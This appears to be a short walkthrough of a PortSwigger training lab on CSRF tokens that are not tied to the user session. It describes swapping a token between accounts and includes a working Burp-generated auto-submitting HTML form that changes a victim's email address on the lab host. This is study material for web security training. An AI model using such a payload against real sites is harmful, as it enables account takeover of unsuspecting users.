![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/2b89c966-1510-4ecc-b548-559a23fcae0b)

### Solution

updated the email after loggin in using credentials

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/6c37e27c-0f2f-42a6-a72f-232b42f0721f)

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/806dc9f2-bf40-4318-8014-573959696676)

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/7e7aba4d-ac1e-418c-9bcc-08d19647a41a)

now open an incognito tab and login as carlos and update the email address

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/f0588312-91d2-464f-a852-6b8c55c5f647)

we took note of the csrf token.

now replace this token in the other account and we can see that it is accepted.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/700f2d5d-e071-4acf-b2e7-cb7bc5b71da6)

generate a csrf poc

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/82da0487-606d-49a4-a3bc-49ef662637bb)

payload

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6100a703f79ccb801ee4a9004a000e.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="rahul&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="e6t6B2GiyQ35fYhwr6t2Hn1WSjdU0hHV" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/1bc6d09f-36df-415f-acbd-fec3001b6307)

click deliver to solve the lab

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/78b242dc-88af-408c-83d1-9367920dd071)
